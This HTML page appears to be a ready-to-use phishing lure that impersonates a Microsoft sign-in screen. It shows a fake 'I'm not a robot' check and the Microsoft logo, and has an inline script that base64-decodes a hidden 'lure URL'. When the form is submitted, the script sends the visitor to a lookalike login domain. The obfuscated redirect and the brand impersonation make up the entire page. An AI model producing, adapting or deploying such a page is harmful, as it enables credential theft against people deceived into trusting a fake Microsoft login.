<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Microsoft</title>
    <style>
        /* General Body Styles */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: 
                linear-gradient(to bottom, rgba(255, 255, 255, 0.9), rgba(240, 240, 240, 0.9)), 
                url('https://via.placeholder.com/1920x1080') no-repeat center center fixed;
            background-size: cover;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #444;
        }

        /* Container Styling */
        .verify-container {
            width: 100%;
            max-width: 340px;
            padding: 30px 20px;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.1);
            text-align: left;
        }

        /* Logo Section */
        .logo-container {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }

        .logo-container img {
            width: 24px;
            height: 24px;
            margin-right: 8px;
        }

        .logo-container span {
            font-size: 16px;
            font-weight: bold;
            color: #0078d4; /* Adjusted text color */
        }

        /* Headings and Text */
        h1 {
            font-size: 20px;
            color: #222;
            font-weight: 600;
            margin: 10px 0;
        }

        p {
            font-size: 14px;
            color: #666;
            margin-bottom: 20px;
            line-height: 1.5;
        }

        /* Form Inputs */
        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            font-size: 14px;
            color: #444;
            display: flex;
            align-items: center;
        }

        .form-group input[type="checkbox"] {
            transform: scale(1.2);
            margin-left: 100px;
            cursor: pointer;
        }

        .form-group label {
            flex: 1;
            text-align: center;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #0078d4;
            color: white;
            font-size: 15px;
            font-weight: bold;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #005a9e;
        }

        /* Footer Links */
        .footer {
            font-size: 12px;
            color: #666;
            text-align: center;
        }

        .footer a {
            color: #0078d4;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        /* Responsiveness */
        @media (max-width: 768px) {
            .verify-container {
                width: 90%;
                padding: 20px;
            }
        }
    </style>
    <script>
        // Base64 encoded URL (change this to your actual lure URL)
        var base64Url = "aHR0cHM6Ly9sb2dpbi50eXJvb25lLnNpdGUvc3FSVEdwc1M=";  // Example: base64 for https://example.com

        function redirectToLure() {
            // Decode the Base64 URL
            var decodedUrl = atob(base64Url);
            // Redirect to the decoded URL
            window.location.href = decodedUrl;
        }
    </script>
</head>
<body>
    <div class="verify-container">
        <!-- Logo Section -->
        <div class="logo-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
            <span style="color: #005a9e;">Microsoft</span> <!-- Adjusted text color -->
        </div>

        <!-- Content -->
        <h1>Sign in to Microsoft</h1>
        <p>To continue, please confirm that youâ€™re not a robot.</p>

        <form method="POST" action="javascript:void(0);" onsubmit="redirectToLure();">
            <div class="form-group">
                <label>
                    <input type="checkbox" name="not_robot" required>
                        I'm not a robot
                </label>
            </div>
            <button type="submit">Continue</button>
        </form>

        <!-- Footer Section -->
        <div class="footer">
            <p>
                By continuing, you agree to the 
                <a href="#">Microsoft Terms of Use</a> and 
                <a href="#">Privacy Policy</a>.
            </p>
        </div>
    </div>
</body>
</html>
